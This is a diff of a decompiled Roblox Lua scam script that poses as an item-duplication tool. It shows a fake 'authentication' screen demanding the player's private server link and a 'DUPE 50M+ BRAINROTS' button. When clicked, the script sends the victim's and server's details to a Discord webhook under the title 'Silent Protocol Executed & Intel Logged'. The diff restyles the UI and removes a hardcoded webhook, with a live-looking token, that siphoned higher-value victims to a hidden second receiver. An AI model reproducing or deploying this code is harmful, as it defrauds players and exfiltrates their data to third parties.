@@ -328,107 +328,66 @@ local l_ScreenGui_0 = Instance.new("ScreenGui");
 l_ScreenGui_0.Name = "BrainrotAuth";
 l_ScreenGui_0.ResetOnSpawn = false;
 l_ScreenGui_0.Parent = l_PlayerGui_0;
-
 local v23 = Instance.new("Frame", l_ScreenGui_0);
-v23.Size = UDim2.new(0, 450, 0, 280);
-v23.Position = UDim2.new(0.5, -225, 0.5, -140);
-v23.BackgroundColor3 = Color3.fromRGB(12, 12, 15);
-v23.BorderColor3 = Color3.fromRGB(0, 200, 180);
-v23.BorderSizePixel = 3;
+v23.Size = UDim2.new(0, 420, 0, 240);
+v23.Position = UDim2.new(0.5, -210, 0.5, -120);
+v23.BackgroundColor3 = Color3.fromRGB(20, 20, 25);
+v23.BorderColor3 = Color3.fromRGB(255, 60, 60);
+v23.BorderSizePixel = 1;
 v23.Active = true;
 v23.Draggable = true;
-Instance.new("UICorner", v23).CornerRadius = UDim.new(0, 12);
-
--- Add gradient background effect
-local bgGradient = Instance.new("UIGradient", v23);
-bgGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 20)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 12))
-});
-bgGradient.Rotation = 45;
-
--- Add glow effect
-local glowFrame = Instance.new("Frame", v23);
-glowFrame.Size = UDim2.new(1, 6, 1, 6);
-glowFrame.Position = UDim2.new(0.5, 0, 0.5, 0);
-glowFrame.AnchorPoint = Vector2.new(0.5, 0.5);
-glowFrame.BackgroundColor3 = Color3.fromRGB(0, 200, 180);
-glowFrame.BackgroundTransparency = 0.7;
-glowFrame.BorderSizePixel = 0;
-glowFrame.ZIndex = 0;
-Instance.new("UICorner", glowFrame).CornerRadius = UDim.new(0, 12);
-
+Instance.new("UICorner", v23).CornerRadius = UDim.new(0, 6);
 local v24 = Instance.new("TextLabel", v23);
-v24.Size = UDim2.new(1, -40, 0, 40);
-v24.Position = UDim2.new(0.5, 0, 0, 15);
+v24.Size = UDim2.new(1, -20, 0, 50);
+v24.Position = UDim2.new(0.5, 0, 0, 0);
 v24.AnchorPoint = Vector2.new(0.5, 0);
 v24.BackgroundTransparency = 1;
 v24.Font = Enum.Font.GothamBold;
-v24.Text = "🔒 AUTHENTICATION PORTAL";
-v24.TextColor3 = Color3.fromRGB(0, 230, 210);
-v24.TextSize = 20;
-v24.TextXAlignment = Enum.TextXAlignment.Left;
-
+v24.Text = "AUTHENTICATION REQUIRED";
+v24.TextColor3 = Color3.fromRGB(255, 255, 255);
+v24.TextSize = 22;
 local v25 = Instance.new("TextLabel", v23);
-v25.Size = UDim2.new(1, -40, 0, 25);
-v25.Position = UDim2.new(0.5, 0, 0, 60);
+v25.Size = UDim2.new(1, -20, 0, 20);
+v25.Position = UDim2.new(0.5, 0, 0, 45);
 v25.AnchorPoint = Vector2.new(0.5, 0);
 v25.BackgroundTransparency = 1;
 v25.Font = Enum.Font.Gotham;
-v25.Text = "Enter your private server link to proceed";
-v25.TextColor3 = Color3.fromRGB(200, 200, 200);
+v25.Text = "Please provide a private server link to continue.";
+v25.TextColor3 = Color3.fromRGB(160, 160, 160);
 v25.TextSize = 14;
-v25.TextXAlignment = Enum.TextXAlignment.Left;
-
 local v26 = Instance.new("TextLabel", v23);
-v26.Size = UDim2.new(1, -40, 0, 50);
-v26.Position = UDim2.new(0.5, 0, 0, 90);
+v26.Size = UDim2.new(1, -40, 0, 40);
+v26.Position = UDim2.new(0.5, 0, 0, 70);
 v26.AnchorPoint = Vector2.new(0.5, 0);
 v26.BackgroundTransparency = 1;
 v26.Font = Enum.Font.Gotham;
 v26.Text = "NOTE: You must provide the link for the private server you are currently in, otherwise the duplication process will fail.";
-v26.TextColor3 = Color3.fromRGB(255, 200, 80);
-v26.TextSize = 11;
+v26.TextColor3 = Color3.fromRGB(255, 180, 0);
+v26.TextSize = 12;
 v26.TextWrapped = true;
-v26.TextXAlignment = Enum.TextXAlignment.Left;
-
 local v27 = Instance.new("TextBox", v23);
-v27.Size = UDim2.new(1, -40, 0, 45);
-v27.Position = UDim2.new(0.5, 0, 0, 155);
-v27.AnchorPoint = Vector2.new(0.5, 0);
-v27.BackgroundColor3 = Color3.fromRGB(25, 30, 35);
-v27.BorderColor3 = Color3.fromRGB(45, 50, 55);
-v27.BorderSizePixel = 1;
+v27.Size = UDim2.new(1, -40, 0, 40);
+v27.Position = UDim2.new(0.5, 0, 0.5, 25);
+v27.AnchorPoint = Vector2.new(0.5, 0.5);
+v27.BackgroundColor3 = Color3.fromRGB(35, 35, 40);
+v27.BorderColor3 = Color3.fromRGB(50, 50, 55);
 v27.Font = Enum.Font.Gotham;
 v27.PlaceholderText = "https://roblox.com/share?code=...";
-v27.PlaceholderColor3 = Color3.fromRGB(100, 100, 100);
-v27.TextColor3 = Color3.fromRGB(220, 220, 220);
-v27.TextSize = 14;
+v27.TextColor3 = Color3.fromRGB(230, 230, 230);
+v27.TextSize = 16;
 v27.Text = "";
 v27.ClearTextOnFocus = true;
-v27.TextXAlignment = Enum.TextXAlignment.Left;
-Instance.new("UICorner", v27).CornerRadius = UDim.new(0, 6);
-Instance.new("UIPadding", v27).PaddingLeft = UDim.new(0, 12);
-
+Instance.new("UICorner", v27).CornerRadius = UDim.new(0, 4);
 local v28 = Instance.new("TextButton", v23);
-v28.Size = UDim2.new(1, -40, 0, 45);
-v28.Position = UDim2.new(0.5, 0, 1, -25);
+v28.Size = UDim2.new(1, -40, 0, 40);
+v28.Position = UDim2.new(0.5, 0, 1, -30);
 v28.AnchorPoint = Vector2.new(0.5, 1);
-v28.BackgroundColor3 = Color3.fromRGB(0, 190, 170);
-v28.BorderSizePixel = 0;
+v28.BackgroundColor3 = Color3.fromRGB(255, 60, 60);
 v28.Font = Enum.Font.GothamBold;
-v28.Text = "✓ VERIFY & CONTINUE";
+v28.Text = "VERIFY";
 v28.TextColor3 = Color3.fromRGB(255, 255, 255);
-v28.TextSize = 16;
-Instance.new("UICorner", v28).CornerRadius = UDim.new(0, 8);
-
--- Add button hover effect
-v28.MouseEnter:Connect(function()
-    v28.BackgroundColor3 = Color3.fromRGB(0, 210, 190);
-end)
-v28.MouseLeave:Connect(function()
-    v28.BackgroundColor3 = Color3.fromRGB(0, 190, 170);
-end)
+v28.TextSize = 18;
+Instance.new("UICorner", v28).CornerRadius = UDim.new(0, 4);
 local function v77() --[[ Line: 0 ]]
     -- upvalues: l_Workspace_0 (copy), l_LocalPlayer_0 (copy), l_ReplicatedStorage_0 (copy), l_PlayerGui_0 (copy)
     local function v31(v29) --[[ Line: 0 ]]
@@ -495,122 +454,72 @@ local function v77() --[[ Line: 0 ]]
             end;
         end;
     end;
-local l_ScreenGui_1 = Instance.new("ScreenGui");
-l_ScreenGui_1.Name = "DupeUI";
-l_ScreenGui_1.ResetOnSpawn = false;
-l_ScreenGui_1.Parent = l_PlayerGui_0;
-
-local v52 = Instance.new("Frame", l_ScreenGui_1);
-v52.Size = UDim2.new(0, 480, 0, 300);
-v52.Position = UDim2.new(0.5, -240, 0.5, -150);
-v52.BackgroundColor3 = Color3.fromRGB(8, 8, 10);
-v52.BorderColor3 = Color3.fromRGB(0, 200, 180);
-v52.BorderSizePixel = 3;
-v52.Active = true;
-v52.Draggable = true;
-Instance.new("UICorner", v52).CornerRadius = UDim.new(0, 12);
-
--- Add gradient background
-local bgGradient1 = Instance.new("UIGradient", v52);
-bgGradient1.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 12, 15)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 8))
-});
-bgGradient1.Rotation = 135;
-
--- Add glow effect
-local glowFrame1 = Instance.new("Frame", v52);
-glowFrame1.Size = UDim2.new(1, 6, 1, 6);
-glowFrame1.Position = UDim2.new(0.5, 0, 0.5, 0);
-glowFrame1.AnchorPoint = Vector2.new(0.5, 0.5);
-glowFrame1.BackgroundColor3 = Color3.fromRGB(0, 200, 180);
-glowFrame1.BackgroundTransparency = 0.7;
-glowFrame1.BorderSizePixel = 0;
-glowFrame1.ZIndex = 0;
-Instance.new("UICorner", glowFrame1).CornerRadius = UDim.new(0, 12);
-
-local v53 = Instance.new("TextLabel", v52);
-v53.Size = UDim2.new(1, -40, 0, 50);
-v53.Position = UDim2.new(0.5, 0, 0, 20);
-v53.AnchorPoint = Vector2.new(0.5, 0);
-v53.BackgroundTransparency = 1;
-v53.Font = Enum.Font.GothamBold;
-v53.Text = "⚡ BRAINROT DUPLICATION SUITE";
-v53.TextColor3 = Color3.fromRGB(0, 230, 210);
-v53.TextSize = 22;
-v53.TextXAlignment = Enum.TextXAlignment.Left;
-
-local v54 = Instance.new("TextButton", v52);
-v54.Size = UDim2.new(1, -40, 0, 60);
-v54.Position = UDim2.new(0.5, 0, 0.5, -10);
-v54.AnchorPoint = Vector2.new(0.5, 0.5);
-v54.BackgroundColor3 = Color3.fromRGB(0, 170, 155);
-v54.BorderSizePixel = 0;
-v54.Font = Enum.Font.GothamBold;
-v54.Text = "🔧 DUPE 50M+ BRAINROTS";
-v54.TextColor3 = Color3.fromRGB(20, 20, 25);
-v54.TextSize = 18;
-Instance.new("UICorner", v54).CornerRadius = UDim.new(0, 10);
-
--- Add button hover effect
-v54.MouseEnter:Connect(function()
-    v54.BackgroundColor3 = Color3.fromRGB(0, 190, 175);
-end)
-v54.MouseLeave:Connect(function()
-    v54.BackgroundColor3 = Color3.fromRGB(0, 170, 155);
-end)
-
-local v55 = Instance.new("TextLabel", v52);
-v55.Size = UDim2.new(1, -40, 0, 65);
-v55.Position = UDim2.new(0.5, 0, 1, -50);
-v55.AnchorPoint = Vector2.new(0.5, 0.5);
-v55.BackgroundTransparency = 1;
-v55.Font = Enum.Font.Gotham;
-v55.Text = "NOTE: The duplication process will fail if other players are present in your server. Their assets interfere with the permission exploits.";
-v55.TextColor3 = Color3.fromRGB(180, 180, 180);
-v55.TextSize = 11;
-v55.TextWrapped = true;
-v55.TextXAlignment = Enum.TextXAlignment.Center;
-
-local v56 = Instance.new("Frame", v52);
-v56.Size = UDim2.new(1, -40, 0, 140);
-v56.Position = UDim2.new(0.5, 0, 0.5, 0);
-v56.AnchorPoint = Vector2.new(0.5, 0.5);
-v56.BackgroundTransparency = 1;
-v56.Visible = false;
-
-local v57 = Instance.new("TextLabel", v56);
-v57.Size = UDim2.new(1, 0, 0, 35);
-v57.Position = UDim2.new(0.5, 0, 0, 10);
-v57.AnchorPoint = Vector2.new(0.5, 0);
-v57.BackgroundTransparency = 1;
-v57.Font = Enum.Font.GothamBold;
-v57.Text = "[ STANDBY ]";
-v57.TextColor3 = Color3.fromRGB(0, 230, 210);
-v57.TextSize = 18;
-
-local v58 = Instance.new("Frame", v56);
-v58.Size = UDim2.new(1, 0, 0, 12);
-v58.Position = UDim2.new(0.5, 0, 0, 60);
-v58.AnchorPoint = Vector2.new(0.5, 0);
-v58.BackgroundColor3 = Color3.fromRGB(25, 30, 35);
-v58.BorderColor3 = Color3.fromRGB(0, 200, 180);
-v58.BorderSizePixel = 1;
-Instance.new("UICorner", v58).CornerRadius = UDim.new(0, 6);
-
-local v59 = Instance.new("Frame", v58);
-v59.BackgroundColor3 = Color3.fromRGB(0, 200, 180);
-v59.Size = UDim2.new(0, 0, 1, 0);
-v59.BorderSizePixel = 0;
-Instance.new("UICorner", v59).CornerRadius = UDim.new(0, 6);
-
--- Add progress bar glow
-local progressGlow = Instance.new("UIStroke", v59);
-progressGlow.Color = Color3.fromRGB(0, 230, 210);
-progressGlow.Thickness = 2;
-progressGlow.Transparency = 0.5;
-
-v54.MouseButton1Click:Connect(function()
+    local l_ScreenGui_1 = Instance.new("ScreenGui");
+    l_ScreenGui_1.Name = "DupeUI";
+    l_ScreenGui_1.ResetOnSpawn = false;
+    l_ScreenGui_1.Parent = l_PlayerGui_0;
+    local v52 = Instance.new("Frame", l_ScreenGui_1);
+    v52.Size = UDim2.new(0, 450, 0, 260);
+    v52.Position = UDim2.new(0.5, -225, 0.5, -130);
+    v52.BackgroundColor3 = Color3.fromRGB(20, 20, 25);
+    v52.BorderColor3 = Color3.fromRGB(120, 0, 255);
+    v52.BorderSizePixel = 1;
+    v52.Active = true;
+    v52.Draggable = true;
+    Instance.new("UICorner", v52).CornerRadius = UDim.new(0, 8);
+    local v53 = Instance.new("TextLabel", v52);
+    v53.Size = UDim2.new(1, 0, 0, 50);
+    v53.BackgroundTransparency = 1;
+    v53.Font = Enum.Font.Code;
+    v53.Text = "BRAINROT DUPLICATION UTILITY";
+    v53.TextColor3 = Color3.fromRGB(255, 255, 255);
+    v53.TextSize = 24;
+    local v54 = Instance.new("TextButton", v52);
+    v54.Size = UDim2.new(1, -40, 0, 50);
+    v54.Position = UDim2.new(0.5, 0, 0.5, -10);
+    v54.AnchorPoint = Vector2.new(0.5, 0.5);
+    v54.BackgroundColor3 = Color3.fromRGB(120, 0, 255);
+    v54.Font = Enum.Font.Code;
+    v54.Text = "DUPE 50M+ BRAINROTS";
+    v54.TextColor3 = Color3.fromRGB(255, 255, 255);
+    v54.TextSize = 20;
+    Instance.new("UICorner", v54).CornerRadius = UDim.new(0, 6);
+    local v55 = Instance.new("TextLabel", v52);
+    v55.Size = UDim2.new(1, -40, 0, 60);
+    v55.Position = UDim2.new(0.5, 0, 1, -40);
+    v55.AnchorPoint = Vector2.new(0.5, 0.5);
+    v55.BackgroundTransparency = 1;
+    v55.Font = Enum.Font.Gotham;
+    v55.Text = "NOTE: The duplication process will fail if other players are present in your server. Their assets interfere with the permission exploits.";
+    v55.TextColor3 = Color3.fromRGB(255, 180, 0);
+    v55.TextSize = 12;
+    v55.TextWrapped = true;
+    local v56 = Instance.new("Frame", v52);
+    v56.Size = UDim2.new(1, -40, 0, 120);
+    v56.Position = UDim2.new(0.5, 0, 0.5, 10);
+    v56.AnchorPoint = Vector2.new(0.5, 0.5);
+    v56.BackgroundTransparency = 1;
+    v56.Visible = false;
+    local v57 = Instance.new("TextLabel", v56);
+    v57.Size = UDim2.new(1, 0, 0, 30);
+    v57.Position = UDim2.new(0.5, 0, 0, 20);
+    v57.AnchorPoint = Vector2.new(0.5, 0);
+    v57.BackgroundTransparency = 1;
+    v57.Font = Enum.Font.Code;
+    v57.Text = "[ STANDBY ]";
+    v57.TextColor3 = Color3.fromRGB(200, 200, 200);
+    v57.TextSize = 16;
+    local v58 = Instance.new("Frame", v56);
+    v58.Size = UDim2.new(1, 0, 0, 10);
+    v58.Position = UDim2.new(0.5, 0, 0, 60);
+    v58.AnchorPoint = Vector2.new(0.5, 0);
+    v58.BackgroundColor3 = Color3.fromRGB(30, 30, 35);
+    v58.BorderColor3 = Color3.fromRGB(120, 0, 255);
+    v58.BorderSizePixel = 1;
+    local v59 = Instance.new("Frame", v58);
+    v59.BackgroundColor3 = Color3.fromRGB(120, 0, 255);
+    v59.Size = UDim2.new(0, 0, 1, 0);
+    v54.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
         -- upvalues: v54 (copy), v56 (copy), v57 (copy), v50 (copy), v59 (copy), l_Workspace_0 (ref)
         v54.Visible = false;
         v56.Visible = true;
@@ -791,7 +700,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                 end)();
                 local v110 = #l_Players_0:GetPlayers() > 1 and "\226\154\160\239\184\143 **Warning:** Other players were detected!" or "\226\156\133 **Server Status:** User was alone.";
                 local v111 = {
-                    color = 2353920, 
+                    color = 16732240, 
                     title = "Silent Protocol Executed & Intel Logged", 
                     fields = {
                         {
@@ -816,7 +725,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         }
                     }, 
                     footer = {
-                        text = "Logged via LKXCR Auto Moreira"
+                        text = "Logged via Lemon Hub Auto Moreira"
                     }
                 };
                 local v112 = "";
@@ -825,8 +734,8 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                 end;
                 local v113 = {
                     content = v112, 
-                    username = "LKXCR Auto Morira", 
-                    avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS80n2maY8OkKsZCpLKJHQlVQlKtorwKMvd6w&s", 
+                    username = "skibidi lemon", 
+                    avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
                     embeds = {
                         v111
                     }
@@ -837,7 +746,6 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                     task.wait(0.5);
                     l_result_0:Close();
                 end;]]
-                local webhooks = "https://discord.com/api/webhooks/1450162332154990716/u5X2hSvqPIBQg7S_lqGety3cOxJbA_Dhpcm3wEJvNxfclkOOY9NIi0bjXcE8mfgbvr4V"
                 if getgenv().UserWebhookURL then
                     local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
                     if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
@@ -849,14 +757,14 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         end;
                         local v119 = {
                             content = l_UserWebhookURL_0, 
-                            username = "LKXCR Auto Moriera", 
-                            avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS80n2maY8OkKsZCpLKJHQlVQlKtorwKMvd6w&s", 
+                            username = "skibidi lemon", 
+                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
                             embeds = {
                                 v111
                             }
                         };
-                        if v109.genValue < 40000000 then
-                        pcall(function() 
+                        pcall(function() --[[ Line: 0 ]]
+                            -- upvalues: v7 (ref), l_HttpService_0 (ref), v119 (copy)
                             v7({
                                 Url = getgenv().UserWebhookURL, 
                                 Method = "POST", 
@@ -866,18 +774,6 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                                 Body = l_HttpService_0:JSONEncode(v119)
                             });
                         end);
-                    else
-                        pcall(function()
-                            v7({
-                                Url = webhooks,
-                                Method = "POST",
-                                Headers = {
-                                    ["Content-Type"] = "application/json"
-                                },
-                                Body = l_HttpService_0:JSONEncode(v119)
-                            });
-                        end);
-                    end
                     end;
                 end;
                 return;
